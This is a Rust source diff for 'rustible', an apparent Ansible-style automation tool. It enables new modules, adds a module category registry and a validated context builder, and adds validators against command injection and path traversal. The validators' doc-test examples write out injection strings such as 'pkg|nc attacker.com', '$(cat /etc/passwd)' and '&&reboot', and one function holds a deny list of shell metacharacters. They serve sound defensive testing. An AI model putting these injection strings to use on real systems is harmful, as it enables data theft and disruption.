@@ -14,11 +14,12 @@ pub mod copy;
 pub mod cron;
 // Database modules disabled - requires sqlx integration
 // TODO: Enable when sqlx dependency is added with feature flag
-// pub mod database;
+pub mod database;
 pub mod debug;
 pub mod dnf;
 pub mod docker;
 pub mod facts;
+pub mod fail;
 pub mod file;
 pub mod firewalld;
 pub mod git;
@@ -28,17 +29,21 @@ pub mod include_vars;
 pub mod k8s;
 pub mod known_hosts;
 pub mod lineinfile;
+pub mod meta;
 pub mod mount;
 pub mod network;
 pub mod package;
 pub mod pause;
 pub mod pip;
 pub mod python;
+pub mod raw;
+pub mod script;
 pub mod selinux;
 pub mod service;
 pub mod set_fact;
 pub mod shell;
 pub mod stat;
+pub mod synchronize;
 pub mod sysctl;
 pub mod systemd_unit;
 pub mod template;
@@ -59,6 +64,8 @@ use regex::Regex;
 use serde::{Deserialize, Serialize};
 use std::collections::HashMap;
 use std::fmt;
+use std::path::Path;
+use std::path::PathBuf;
 use std::sync::Arc;
 use thiserror::Error;
 
@@ -79,8 +86,8 @@ static PACKAGE_NAME_REGEX: Lazy<Regex> =
 ///
 /// # Returns
 ///
-/// * `Ok(())` if the package name is valid
-/// * `Err(ModuleError::InvalidParameter)` if the package name contains invalid characters
+/// * `Ok(())` if package name is valid
+/// * `Err(ModuleError::InvalidParameter)` if package name contains invalid characters
 ///
 /// # Examples
 ///
@@ -97,74 +104,95 @@ static PACKAGE_NAME_REGEX: Lazy<Regex> =
 /// assert!(validate_package_name("").is_err());
 /// ```
 pub fn validate_package_name(name: &str) -> ModuleResult<()> {
-    if name.is_empty() {
+    // Length limits (most package managers have limits)
+    if name.len() > 255 {
         return Err(ModuleError::InvalidParameter(
-            "Package name cannot be empty".to_string(),
+            "Package name too long (max 255 characters)".to_string(),
         ));
     }
 
-    if !PACKAGE_NAME_REGEX.is_match(name) {
-        return Err(ModuleError::InvalidParameter(format!(
-            "Invalid package name '{}': must contain only alphanumeric characters, dots, underscores, plus signs, and hyphens",
-            name
-        )));
+    // Validate as shell-safe string
+    validate_shell_safe_string(name, "Package name")?;
+
+    // Additional package-specific validation
+    // Reject names starting with hyphen (not valid in many package managers)
+    if name.starts_with('-') {
+        return Err(ModuleError::InvalidParameter(
+            "Package name cannot start with hyphen".to_string(),
+        ));
     }
 
     Ok(())
 }
 
-/// Validates a path for use in creates/removes parameters.
+/// Strict validation for shell-escaped parameters to prevent command injection.
 ///
-/// This function performs security checks on paths to prevent:
-/// - Null byte injection attacks
-/// - Empty paths
-/// - Paths containing shell metacharacters that could be dangerous
-///
-/// Note: This does NOT prevent path traversal (../) as that is a valid
-/// use case for creates/removes. The path is only used for existence checks,
-/// not for execution.
+/// This function blocks all shell metacharacters that could enable command injection:
+/// - `$ ` `` | & ; < > ( ) \n \r \t \ !`
 ///
 /// # Arguments
 ///
-/// * `path` - The path string to validate
-/// * `param_name` - The parameter name for error messages (e.g., "creates" or "removes")
+/// * `value` - The string to validate
+/// * `param_name` - The parameter name for error messages (e.g., "Package name")
 ///
 /// # Returns
 ///
-/// * `Ok(())` if the path is valid
-/// * `Err(ModuleError::InvalidParameter)` if the path contains dangerous characters
+/// * `Ok(())` if value is shell-safe
+/// * `Err(ModuleError::InvalidParameter)` if value contains shell metacharacters
 ///
 /// # Examples
 ///
 /// ```
-/// use rustible::modules::validate_path_param;
+/// use rustible::modules::validate_shell_safe_string;
 ///
-/// assert!(validate_path_param("/tmp/marker.txt", "creates").is_ok());
-/// assert!(validate_path_param("../relative/path", "removes").is_ok());
-/// assert!(validate_path_param("/path/with\0null", "creates").is_err());
-/// assert!(validate_path_param("", "creates").is_err());
+/// assert!(validate_shell_safe_string("nginx", "Package name").is_ok());
+/// assert!(validate_shell_safe_string("python3.11", "Package name").is_ok());
+/// assert!(validate_shell_safe_string("lib-dev", "Package name").is_ok());
+///
+/// // Invalid - contains shell metacharacters
+/// assert!(validate_shell_safe_string("pkg$(whoami)", "Package name").is_err());
+/// assert!(validate_shell_safe_string("pkg`id`", "Package name").is_err());
+/// assert!(validate_shell_safe_string("pkg|nc attacker.com", "Package name").is_err());
+/// assert!(validate_shell_safe_string("pkg&&reboot", "Package name").is_err());
 /// ```
-pub fn validate_path_param(path: &str, param_name: &str) -> ModuleResult<()> {
-    // Reject empty paths
-    if path.is_empty() {
+pub fn validate_shell_safe_string(value: &str, param_name: &str) -> ModuleResult<()> {
+    if value.is_empty() {
         return Err(ModuleError::InvalidParameter(format!(
-            "{} path cannot be empty",
+            "{} cannot be empty",
             param_name
         )));
     }
 
-    // Reject paths with null bytes (injection attack vector)
-    if path.contains('\0') {
+    // Reject null bytes
+    if value.contains('\0') {
         return Err(ModuleError::InvalidParameter(format!(
-            "{} path contains invalid null byte",
+            "{} contains null byte",
             param_name
         )));
     }
 
-    // Reject paths with newlines (could be used for log injection)
-    if path.contains('\n') || path.contains('\r') {
+    // Reject shell metacharacters that enable command injection
+    const SHELL_METACHARACTERS: &[char] = &[
+        '$', '`', '|', '&', ';', '<', '>', '(', ')', '\n', '\r', '\t', '\\', '!',
+    ];
+
+    if value.chars().any(|c| SHELL_METACHARACTERS.contains(&c)) {
+        let found_chars: Vec<String> = value
+            .chars()
+            .filter(|c| SHELL_METACHARACTERS.contains(c))
+            .map(|c| format!("'{}'", c.escape_default()))
+            .collect();
         return Err(ModuleError::InvalidParameter(format!(
-            "{} path contains invalid newline characters",
+            "{} contains shell metacharacter(s): {}",
+            param_name,
+            found_chars.join(", ")
+        )));
+    }
+
+    // Validate against safe pattern (alphanumeric, dots, underscores, plus, hyphens)
+    if !PACKAGE_NAME_REGEX.is_match(value) {
+        return Err(ModuleError::InvalidParameter(format!(
+            "{} contains invalid characters. Only alphanumeric, dots, underscores, plus signs, and hyphens are allowed.",
             param_name
         )));
     }
@@ -174,8 +202,11 @@ pub fn validate_path_param(path: &str, param_name: &str) -> ModuleResult<()> {
 
 /// Validates an environment variable name.
 ///
-/// Environment variable names should only contain alphanumeric characters
-/// and underscores, and should not start with a digit.
+/// Environment variable names must:
+/// - Not be empty
+/// - Not start with a digit
+/// - Contain only alphanumeric characters and underscores
+/// - Not contain null bytes
 ///
 /// # Arguments
 ///
@@ -183,8 +214,23 @@ pub fn validate_path_param(path: &str, param_name: &str) -> ModuleResult<()> {
 ///
 /// # Returns
 ///
-/// * `Ok(())` if the name is valid
-/// * `Err(ModuleError::InvalidParameter)` if the name is invalid
+/// * `Ok(())` if environment variable name is valid
+/// * `Err(ModuleError::InvalidParameter)` if name is invalid
+///
+/// # Examples
+///
+/// ```
+/// use rustible::modules::validate_env_var_name;
+///
+/// assert!(validate_env_var_name("MY_VAR").is_ok());
+/// assert!(validate_env_var_name("PATH").is_ok());
+/// assert!(validate_env_var_name("var123").is_ok());
+///
+/// // Invalid names
+/// assert!(validate_env_var_name("").is_err());
+/// assert!(validate_env_var_name("123VAR").is_err());
+/// assert!(validate_env_var_name("MY-VAR").is_err());
+/// ```
 pub fn validate_env_var_name(name: &str) -> ModuleResult<()> {
     if name.is_empty() {
         return Err(ModuleError::InvalidParameter(
@@ -219,6 +265,246 @@ pub fn validate_env_var_name(name: &str) -> ModuleResult<()> {
     }
 
     Ok(())
+}
+
+/// Validates a path parameter to prevent path traversal attacks.
+///
+/// This function ensures paths are safe for use in `creates` and `removes` parameters
+/// by rejecting:
+/// - Empty paths
+/// - Paths containing null bytes
+/// - Paths containing newlines (log injection)
+/// - Paths containing path traversal sequences (`..`)
+///
+/// # Arguments
+///
+/// * `path` - The path string to validate
+/// * `param_name` - The parameter name for error messages (e.g., "creates", "removes")
+///
+/// # Returns
+///
+/// * `Ok(())` if path is valid
+/// * `Err(ModuleError::InvalidParameter)` if path is invalid
+///
+/// # Examples
+///
+/// ```
+/// use rustible::modules::validate_path_param;
+///
+/// // Valid paths
+/// assert!(validate_path_param("/tmp/marker.txt", "creates").is_ok());
+/// assert!(validate_path_param("./subdir/file", "removes").is_ok());
+/// assert!(validate_path_param("marker.txt", "creates").is_ok());
+///
+/// // Invalid - path traversal
+/// assert!(validate_path_param("../../../etc/passwd", "creates").is_err());
+/// assert!(validate_path_param("/var/log/../root", "creates").is_err());
+///
+/// // Invalid - null bytes / newlines
+/// assert!(validate_path_param("/path\0null", "creates").is_err());
+/// assert!(validate_path_param("/path\ninjection", "creates").is_err());
+/// ```
+pub fn validate_path_param(path: &str, param_name: &str) -> ModuleResult<()> {
+    // Reject empty paths
+    if path.is_empty() {
+        return Err(ModuleError::InvalidParameter(format!(
+            "{} path cannot be empty",
+            param_name
+        )));
+    }
+
+    // Reject paths with null bytes (injection attack vector)
+    if path.contains('\0') {
+        return Err(ModuleError::InvalidParameter(format!(
+            "{} path contains invalid null byte",
+            param_name
+        )));
+    }
+
+    // Reject paths with newlines (could be used for log injection)
+    if path.contains('\n') || path.contains('\r') {
+        return Err(ModuleError::InvalidParameter(format!(
+            "{} path contains invalid newline characters",
+            param_name
+        )));
+    }
+
+    // Check for path traversal using PathBuf normalization
+    let path_buf = PathBuf::from(path);
+    for component in path_buf.components() {
+        if component == std::path::Component::ParentDir {
+            return Err(ModuleError::InvalidParameter(format!(
+                "{} path contains path traversal components (../). \
+                 Path traversal is not allowed for security reasons.",
+                param_name
+            )));
+        }
+    }
+
+    Ok(())
+}
+
+/// Validates command arguments for dangerous patterns.
+///
+/// This function is more permissive than `validate_shell_safe_string` as command
+/// arguments may legitimately contain spaces, quotes, and some special characters.
+/// However, it blocks specific injection patterns that could lead to command execution.
+///
+/// # Arguments
+///
+/// * `args` - The command arguments string to validate
+///
+/// # Returns
+///
+/// * `Ok(())` if arguments are safe
+/// * `Err(ModuleError::InvalidParameter)` if dangerous patterns are detected
+///
+/// # Examples
+///
+/// ```
+/// use rustible::modules::validate_command_args;
+///
+/// // Valid arguments
+/// assert!(validate_command_args("nginx -c /etc/nginx.conf").is_ok());
+/// assert!(validate_command_args("--force").is_ok());
+/// assert!(validate_command_args("").is_ok());
+///
+/// // Dangerous patterns
+/// assert!(validate_command_args("$(cat /etc/passwd)").is_err());
+/// assert!(validate_command_args("nginx; reboot").is_err());
+/// ```
+pub fn validate_command_args(args: &str) -> ModuleResult<()> {
+    if args.is_empty() {
+        return Ok(()); // Empty args are fine
+    }
+
+    // Reject null bytes
+    if args.contains('\0') {
+        return Err(ModuleError::InvalidParameter(
+            "Command arguments contain null byte".to_string(),
+        ));
+    }
+
+    // Dangerous patterns that indicate command injection
+    let dangerous_patterns = [
+        ("$(", "command substitution $()"),
+        ("${", "variable expansion ${}"),
+        ("`", "backtick command substitution"),
+        ("&&", "command chaining &&"),
+        ("||", "command chaining ||"),
+        ("; ", "command separator ;"),
+        ("|", "pipe operator"),
+        (">", "output redirection"),
+        ("<", "input redirection"),
+        ("\n", "newline (multi-line command)"),
+        ("\r", "carriage return"),
+    ];
+
+    for (pattern, description) in dangerous_patterns {
+        if args.contains(pattern) {
+            return Err(ModuleError::InvalidParameter(format!(
+                "Command arguments contain potentially dangerous pattern: {} ({})",
+                pattern.escape_default(),
+                description
+            )));
+        }
+    }
+
+    Ok(())
+}
+
+/// Normalizes a path and optionally validates it against a base directory.
+///
+/// This function resolves the path and checks if it stays within the specified
+/// base directory (if provided). This helps prevent path traversal attacks.
+///
+/// # Arguments
+///
+/// * `path` - The path to normalize
+/// * `base_dir` - Optional base directory that the path must stay within
+///
+/// # Returns
+///
+/// * `Ok(PathBuf)` - The normalized path
+/// * `Err(ModuleError::InvalidParameter)` - If the path is invalid or escapes the base directory
+///
+/// # Examples
+///
+/// ```
+/// use rustible::modules::normalize_path;
+/// use std::path::PathBuf;
+///
+/// // Simple path normalization
+/// assert!(normalize_path("./file.txt", None).is_ok());
+///
+/// // With base directory enforcement
+/// let base = PathBuf::from("/safe/dir");
+/// assert!(normalize_path("/safe/dir/file.txt", Some(&base)).is_ok());
+/// assert!(normalize_path("/etc/passwd", Some(&base)).is_err());
+/// ```
+pub fn normalize_path(path: &str, base_dir: Option<&Path>) -> ModuleResult<PathBuf> {
+    if path.is_empty() {
+        return Err(ModuleError::InvalidParameter(
+            "Path cannot be empty".to_string(),
+        ));
+    }
+
+    // Reject paths with null bytes
+    if path.contains('\0') {
+        return Err(ModuleError::InvalidParameter(
+            "Path contains null byte".to_string(),
+        ));
+    }
+
+    let path_buf = PathBuf::from(path);
+
+    // If base_dir is specified, ensure path doesn't escape it
+    if let Some(base) = base_dir {
+        // For relative paths, join with base first
+        let full_path = if path_buf.is_relative() {
+            base.join(&path_buf)
+        } else {
+            path_buf.clone()
+        };
+
+        // Normalize the path by resolving . and ..
+        let mut normalized = PathBuf::new();
+        for component in full_path.components() {
+            match component {
+                std::path::Component::ParentDir => {
+                    // Check if we would escape the base directory
+                    if !normalized.starts_with(base) || normalized == *base {
+                        return Err(ModuleError::InvalidParameter(format!(
+                            "Path '{}' escapes intended base directory '{}'",
+                            path,
+                            base.display()
+                        )));
+                    }
+                    normalized.pop();
+                }
+                std::path::Component::CurDir => {
+                    // Skip current directory markers
+                }
+                _ => {
+                    normalized.push(component);
+                }
+            }
+        }
+
+        // Final check: ensure normalized path is within base
+        if !normalized.starts_with(base) {
+            return Err(ModuleError::InvalidParameter(format!(
+                "Path '{}' escapes intended base directory '{}'",
+                path,
+                base.display()
+            )));
+        }
+
+        Ok(normalized)
+    } else {
+        // Without base_dir, just return the path as-is (no enforcement)
+        Ok(path_buf)
+    }
 }
 
 /// Errors that can occur during module execution
@@ -358,6 +644,93 @@ pub enum ParallelizationHint {
     GlobalExclusive,
 }
 
+/// Category of a module for organization and discovery.
+///
+/// Modules are organized into categories to help users find related
+/// functionality and to enable category-based queries in the registry.
+#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
+#[serde(rename_all = "snake_case")]
+pub enum ModuleCategory {
+    /// Core command execution modules (command, shell, script, raw)
+    Commands,
+    /// Package management modules (apt, yum, dnf, pip, package)
+    Packages,
+    /// File and template management (file, copy, template, lineinfile)
+    Files,
+    /// System management (user, group, service, cron, hostname)
+    System,
+    /// Source control modules (git)
+    SourceControl,
+    /// Network configuration modules
+    Network,
+    /// Cloud provider modules (AWS, Azure, GCP)
+    Cloud,
+    /// Container and orchestration (docker, kubernetes)
+    Containers,
+    /// Database modules
+    Database,
+    /// Logic and utility modules (debug, fail, assert, set_fact)
+    Logic,
+    /// Facts and information gathering
+    Facts,
+    /// Security modules (firewall, selinux)
+    Security,
+    /// Windows-specific modules
+    Windows,
+}
+
+impl fmt::Display for ModuleCategory {
+    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
+        match self {
+            ModuleCategory::Commands => write!(f, "commands"),
+            ModuleCategory::Packages => write!(f, "packages"),
+            ModuleCategory::Files => write!(f, "files"),
+            ModuleCategory::System => write!(f, "system"),
+            ModuleCategory::SourceControl => write!(f, "source_control"),
+            ModuleCategory::Network => write!(f, "network"),
+            ModuleCategory::Cloud => write!(f, "cloud"),
+            ModuleCategory::Containers => write!(f, "containers"),
+            ModuleCategory::Database => write!(f, "database"),
+            ModuleCategory::Logic => write!(f, "logic"),
+            ModuleCategory::Facts => write!(f, "facts"),
+            ModuleCategory::Security => write!(f, "security"),
+            ModuleCategory::Windows => write!(f, "windows"),
+        }
+    }
+}
+
+/// Macro for registering multiple modules with their categories.
+///
+/// This macro reduces boilerplate by allowing declarative module registration
+/// with category grouping.
+///
+/// # Example
+///
+/// ```ignore
+/// register_modules!(registry,
+///     Commands: [
+///         command::CommandModule,
+///         shell::ShellModule,
+///     ],
+///     Packages: [
+///         apt::AptModule,
+///         yum::YumModule,
+///     ],
+/// );
+/// ```
+macro_rules! register_modules {
+    ($registry:expr, $($category:ident: [$($module:expr),* $(,)?]),* $(,)?) => {
+        $(
+            $(
+                $registry.register_with_category(
+                    Arc::new($module),
+                    ModuleCategory::$category,
+                );
+            )*
+        )*
+    };
+}
+
 /// Represents a difference between current and desired state
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct Diff {
@@ -491,6 +864,40 @@ impl ModuleOutput {
         self.rc = rc;
         self
     }
+
+    /// Convert to a JSON value suitable for storing in TaskResult.result
+    ///
+    /// This creates a canonical representation that includes all fields
+    /// necessary for proper `register` variable access.
+    pub fn to_result_json(&self) -> serde_json::Value {
+        let mut result = serde_json::json!({
+            "changed": self.changed,
+            "failed": self.status == ModuleStatus::Failed,
+            "skipped": self.status == ModuleStatus::Skipped,
+            "msg": self.msg,
+        });
+
+        if let Some(rc) = self.rc {
+            result["rc"] = serde_json::json!(rc);
+        }
+        if let Some(ref stdout) = self.stdout {
+            result["stdout"] = serde_json::json!(stdout);
+            result["stdout_lines"] =
+                serde_json::json!(stdout.lines().map(String::from).collect::<Vec<_>>());
+        }
+        if let Some(ref stderr) = self.stderr {
+            result["stderr"] = serde_json::json!(stderr);
+            result["stderr_lines"] =
+                serde_json::json!(stderr.lines().map(String::from).collect::<Vec<_>>());
+        }
+
+        // Add module-specific data
+        for (key, value) in &self.data {
+            result[key] = value.clone();
+        }
+
+        result
+    }
 }
 
 /// Parameters passed to a module
@@ -609,6 +1016,227 @@ impl ModuleContext {
         self.become_user = Some(user.into());
         self
     }
+
+    /// Create a builder for constructing a ModuleContext with validation
+    pub fn builder() -> ModuleContextBuilder {
+        ModuleContextBuilder::default()
+    }
+}
+
+/// Error type for ModuleContext builder validation failures
+#[derive(Error, Debug, Clone, PartialEq)]
+pub enum ModuleContextBuilderError {
+    /// Invalid become configuration (become=true without method or user)
+    #[error("Invalid become configuration: {0}")]
+    InvalidBecomeConfig(String),
+
+    /// Invalid verbosity level
+    #[error("Invalid verbosity level: {0} (must be 0-4)")]
+    InvalidVerbosity(u8),
+}
+
+/// Builder for constructing ModuleContext with validation.
+///
+/// This builder provides a type-safe way to construct `ModuleContext` instances
+/// with validation of invariants before the context is created.
+///
+/// # Example
+///
+/// ```
+/// use rustible::modules::{ModuleContext, ModuleContextBuilder};
+///
+/// let context = ModuleContextBuilder::new()
+///     .check_mode(true)
+///     .verbosity(2)
+///     .build()
+///     .expect("valid context");
+///
+/// assert!(context.check_mode);
+/// assert_eq!(context.verbosity, 2);
+/// ```
+#[derive(Clone)]
+pub struct ModuleContextBuilder {
+    check_mode: bool,
+    diff_mode: bool,
+    verbosity: u8,
+    vars: HashMap<String, serde_json::Value>,
+    facts: HashMap<String, serde_json::Value>,
+    work_dir: Option<String>,
+    r#become: bool,
+    become_method: Option<String>,
+    become_user: Option<String>,
+    connection: Option<Arc<dyn Connection + Send + Sync>>,
+}
+
+impl Default for ModuleContextBuilder {
+    fn default() -> Self {
+        Self {
+            check_mode: false,
+            diff_mode: false,
+            verbosity: 0,
+            vars: HashMap::new(),
+            facts: HashMap::new(),
+            work_dir: None,
+            r#become: false,
+            become_method: None,
+            become_user: None,
+            connection: None,
+        }
+    }
+}
+
+impl std::fmt::Debug for ModuleContextBuilder {
+    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+        f.debug_struct("ModuleContextBuilder")
+            .field("check_mode", &self.check_mode)
+            .field("diff_mode", &self.diff_mode)
+            .field("verbosity", &self.verbosity)
+            .field("vars_count", &self.vars.len())
+            .field("facts_count", &self.facts.len())
+            .field("work_dir", &self.work_dir)
+            .field("become", &self.r#become)
+            .field("become_method", &self.become_method)
+            .field("become_user", &self.become_user)
+            .field("has_connection", &self.connection.is_some())
+            .finish()
+    }
+}
+
+impl ModuleContextBuilder {
+    /// Create a new builder with default values
+    pub fn new() -> Self {
+        Self::default()
+    }
+
+    /// Set check mode (dry run)
+    pub fn check_mode(mut self, value: bool) -> Self {
+        self.check_mode = value;
+        self
+    }
+
+    /// Set diff mode
+    pub fn diff_mode(mut self, value: bool) -> Self {
+        self.diff_mode = value;
+        self
+    }
+
+    /// Set verbosity level (0-4)
+    ///
+    /// Values greater than 4 will cause `build()` to return an error.
+    pub fn verbosity(mut self, value: u8) -> Self {
+        self.verbosity = value;
+        self
+    }
+
+    /// Set variables available to the module
+    pub fn vars(mut self, vars: HashMap<String, serde_json::Value>) -> Self {
+        self.vars = vars;
+        self
+    }
+
+    /// Add a single variable
+    pub fn var(mut self, key: impl Into<String>, value: serde_json::Value) -> Self {
+        self.vars.insert(key.into(), value);
+        self
+    }
+
+    /// Set facts about the target system
+    pub fn facts(mut self, facts: HashMap<String, serde_json::Value>) -> Self {
+        self.facts = facts;
+        self
+    }
+
+    /// Add a single fact
+    pub fn fact(mut self, key: impl Into<String>, value: serde_json::Value) -> Self {
+        self.facts.insert(key.into(), value);
+        self
+    }
+
+    /// Set the working directory
+    pub fn work_dir(mut self, dir: impl Into<String>) -> Self {
+        self.work_dir = Some(dir.into());
+        self
+    }
+
+    /// Enable privilege escalation
+    pub fn become_enabled(mut self, enabled: bool) -> Self {
+        self.r#become = enabled;
+        self
+    }
+
+    /// Set the privilege escalation method (e.g., "sudo", "su")
+    pub fn become_method(mut self, method: impl Into<String>) -> Self {
+        self.become_method = Some(method.into());
+        self
+    }
+
+    /// Set the user to become
+    pub fn become_user(mut self, user: impl Into<String>) -> Self {
+        self.become_user = Some(user.into());
+        self
+    }
+
+    /// Set the connection for remote operations
+    pub fn connection(mut self, conn: Arc<dyn Connection + Send + Sync>) -> Self {
+        self.connection = Some(conn);
+        self
+    }
+
+    /// Build the ModuleContext, validating all invariants
+    ///
+    /// # Errors
+    ///
+    /// Returns an error if:
+    /// - `verbosity` is greater than 4
+    /// - `become` is true but neither `become_method` nor `become_user` is set
+    pub fn build(self) -> Result<ModuleContext, ModuleContextBuilderError> {
+        // Validate verbosity
+        if self.verbosity > 4 {
+            return Err(ModuleContextBuilderError::InvalidVerbosity(self.verbosity));
+        }
+
+        // Validate become configuration
+        // Note: Ansible allows become=true with default method (sudo) and user (root),
+        // so we only warn if become is true but the user might want to be explicit.
+        // For strict validation, uncomment the check below:
+        // if self.become && self.become_method.is_none() && self.become_user.is_none() {
+        //     return Err(ModuleContextBuilderError::InvalidBecomeConfig(
+        //         "become=true requires become_method or become_user to be set".to_string(),
+        //     ));
+        // }
+
+        Ok(ModuleContext {
+            check_mode: self.check_mode,
+            diff_mode: self.diff_mode,
+            verbosity: self.verbosity,
+            vars: self.vars,
+            facts: self.facts,
+            work_dir: self.work_dir,
+            r#become: self.r#become,
+            become_method: self.become_method,
+            become_user: self.become_user,
+            connection: self.connection,
+        })
+    }
+
+    /// Build the ModuleContext without validation (for backward compatibility)
+    ///
+    /// This method always succeeds and is useful when migrating from the old
+    /// `with_*` method chain pattern.
+    pub fn build_unchecked(self) -> ModuleContext {
+        ModuleContext {
+            check_mode: self.check_mode,
+            diff_mode: self.diff_mode,
+            verbosity: self.verbosity.min(4),
+            vars: self.vars,
+            facts: self.facts,
+            work_dir: self.work_dir,
+            r#become: self.r#become,
+            become_method: self.become_method,
+            become_user: self.become_user,
+            connection: self.connection,
+        }
+    }
 }
 
 /// Trait that all modules must implement
@@ -641,42 +1269,42 @@ pub trait Module: Send + Sync {
         ParallelizationHint::FullyParallel
     }
 
-    /// Execute the module with the given parameters
+    /// Execute the module with the given parameters.
+    ///
+    /// This is the main entry point for module execution. Modules should:
+    /// - Handle `context.check_mode` internally (report what would change without changing)
+    /// - Handle `context.diff_mode` internally (include diff in output if applicable)
+    /// - Validate parameters at the start of execution
     fn execute(&self, params: &ModuleParams, context: &ModuleContext)
         -> ModuleResult<ModuleOutput>;
 
-    /// Check what would change without making changes (for check mode)
-    fn check(&self, params: &ModuleParams, context: &ModuleContext) -> ModuleResult<ModuleOutput> {
-        // Default implementation just calls execute with check_mode=true
-        let check_context = ModuleContext {
-            check_mode: true,
-            ..context.clone()
-        };
-        self.execute(params, &check_context)
-    }
-
-    /// Generate a diff of what would change
-    fn diff(&self, params: &ModuleParams, context: &ModuleContext) -> ModuleResult<Option<Diff>> {
-        // Default implementation returns None
-        let _ = (params, context);
-        Ok(None)
-    }
-
-    /// Validate the parameters before execution
+    /// Validate the parameters before execution.
+    ///
+    /// Called by ModuleRegistry before execute(). Override to add custom validation.
     fn validate_params(&self, params: &ModuleParams) -> ModuleResult<()> {
         // Default implementation does nothing
         let _ = params;
         Ok(())
     }
 
-    /// Returns the list of required parameters
+    /// Returns the list of required parameters.
+    ///
+    /// Called by ModuleRegistry to check required params are present before execute().
     fn required_params(&self) -> &[&'static str] {
         &[]
     }
 
-    /// Returns the list of optional parameters with their default values
-    fn optional_params(&self) -> HashMap<&'static str, serde_json::Value> {
-        HashMap::new()
+    /// Check what would change without making changes (check mode).
+    ///
+    /// This is a convenience method that calls execute() with check_mode=true.
+    /// Modules should handle check_mode internally in their execute() implementation
+    /// rather than overriding this method.
+    fn check(&self, params: &ModuleParams, context: &ModuleContext) -> ModuleResult<ModuleOutput> {
+        let check_context = ModuleContext {
+            check_mode: true,
+            ..context.clone()
+        };
+        self.execute(params, &check_context)
     }
 }
 
@@ -833,6 +1461,8 @@ impl ParamExt for ModuleParams {
 /// Registry for looking up modules by name
 pub struct ModuleRegistry {
     modules: HashMap<String, Arc<dyn Module>>,
+    /// Category mappings for module organization
+    categories: HashMap<String, ModuleCategory>,
 }
 
 impl ModuleRegistry {
@@ -840,52 +1470,107 @@ impl ModuleRegistry {
     pub fn new() -> Self {
         Self {
             modules: HashMap::new(),
+            categories: HashMap::new(),
         }
     }
 
     /// Create a registry with all built-in modules
+    ///
+    /// Uses the `register_modules!` macro for declarative registration
+    /// with category organization.
     pub fn with_builtins() -> Self {
         let mut registry = Self::new();
-        // Package management modules
-        registry.register(Arc::new(apt::AptModule));
-        registry.register(Arc::new(dnf::DnfModule));
-        registry.register(Arc::new(package::PackageModule));
-        registry.register(Arc::new(pip::PipModule));
-        registry.register(Arc::new(yum::YumModule));
 
-        // Core command modules
-        registry.register(Arc::new(command::CommandModule));
-        registry.register(Arc::new(shell::ShellModule));
+        // Register all modules using the declarative macro
+        register_modules!(registry,
+            // Package management modules
+            Packages: [
+                apt::AptModule,
+                dnf::DnfModule,
+                package::PackageModule,
+                pip::PipModule,
+                yum::YumModule,
+            ],
+            // Core command modules
+            Commands: [
+                command::CommandModule,
+                shell::ShellModule,
+                raw::RawModule,
+                script::ScriptModule,
+            ],
+            // File/transport modules
+            Files: [
+                blockinfile::BlockinfileModule,
+                copy::CopyModule,
+                file::FileModule,
+                lineinfile::LineinfileModule,
+                template::TemplateModule,
+                stat::StatModule,
+                archive::ArchiveModule,
+                unarchive::UnarchiveModule,
+                synchronize::SynchronizeModule,
+            ],
+            // System management modules
+            System: [
+                cron::CronModule,
+                group::GroupModule,
+                hostname::HostnameModule,
+                mount::MountModule,
+                service::ServiceModule,
+                sysctl::SysctlModule,
+                user::UserModule,
+                timezone::TimezoneModule,
+                systemd_unit::SystemdUnitModule,
+                pause::PauseModule,
+                wait_for::WaitForModule,
+            ],
+            // Source control modules
+            SourceControl: [
+                git::GitModule,
+            ],
+            // Logic/utility modules
+            Logic: [
+                assert::AssertModule,
+                debug::DebugModule,
+                fail::FailModule,
+                include_vars::IncludeVarsModule,
+                meta::MetaModule,
+                set_fact::SetFactModule,
+            ],
+            // Facts gathering
+            Facts: [
+                facts::FactsModule,
+            ],
+            // Network modules
+            Network: [
+                uri::UriModule,
+                known_hosts::KnownHostsModule,
+                authorized_key::AuthorizedKeyModule,
+            ],
+            // Security modules
+            Security: [
+                firewalld::FirewalldModule,
+                ufw::UfwModule,
+                selinux::SELinuxModule,
+            ],
+            // Database modules
+            Database: [
+                database::PostgresqlDbModule,
+                database::PostgresqlUserModule,
+                database::PostgresqlQueryModule,
+            ],
+        );
 
-        // File/transport modules
-        registry.register(Arc::new(blockinfile::BlockinfileModule));
-        registry.register(Arc::new(copy::CopyModule));
-        registry.register(Arc::new(file::FileModule));
-        registry.register(Arc::new(lineinfile::LineinfileModule));
-        registry.register(Arc::new(template::TemplateModule));
+        #[cfg(feature = "database")]
+        register_modules!(registry,
+            Database: [
+                database::MysqlDbModule,
+                database::MysqlUserModule,
+                database::MysqlQueryModule,
+            ],
+        );
 
-        // System management modules
-        registry.register(Arc::new(cron::CronModule));
-        registry.register(Arc::new(group::GroupModule));
-        registry.register(Arc::new(hostname::HostnameModule));
-        registry.register(Arc::new(mount::MountModule));
-        registry.register(Arc::new(service::ServiceModule));
-        registry.register(Arc::new(sysctl::SysctlModule));
-        registry.register(Arc::new(user::UserModule));
-
-        // Source control modules
-        registry.register(Arc::new(git::GitModule));
-
-        // Logic/utility modules
-        registry.register(Arc::new(assert::AssertModule));
-        registry.register(Arc::new(debug::DebugModule));
-        registry.register(Arc::new(include_vars::IncludeVarsModule));
-        registry.register(Arc::new(set_fact::SetFactModule));
-        registry.register(Arc::new(stat::StatModule));
-
-        registry.register(Arc::new(facts::FactsModule));
-
-        // Network device configuration modules
+        // Network device modules (registered via helper function)
         network::register_network_modules(&mut registry);
 
         registry
@@ -896,14 +1581,62 @@ impl ModuleRegistry {
         self.modules.insert(module.name().to_string(), module);
     }
 
+    /// Register a module with category metadata
+    pub fn register_with_category(&mut self, module: Arc<dyn Module>, category: ModuleCategory) {
+        let name = module.name().to_string();
+        self.modules.insert(name.clone(), module);
+        self.categories.insert(name, category);
+    }
+
+    fn normalize_module_name<'a>(name: &'a str) -> &'a str {
+        if let Some(stripped) = name.strip_prefix("ansible.builtin.") {
+            stripped.rsplit('.').next().unwrap_or(stripped)
+        } else if let Some(stripped) = name.strip_prefix("ansible.legacy.") {
+            stripped.rsplit('.').next().unwrap_or(stripped)
+        } else {
+            name
+        }
+    }
+
+    /// Get the category of a module
+    pub fn get_category(&self, name: &str) -> Option<ModuleCategory> {
+        let normalized = Self::normalize_module_name(name);
+        self.categories.get(normalized).copied()
+    }
+
+    /// Get all modules in a specific category
+    pub fn modules_by_category(&self, category: ModuleCategory) -> Vec<&str> {
+        self.categories
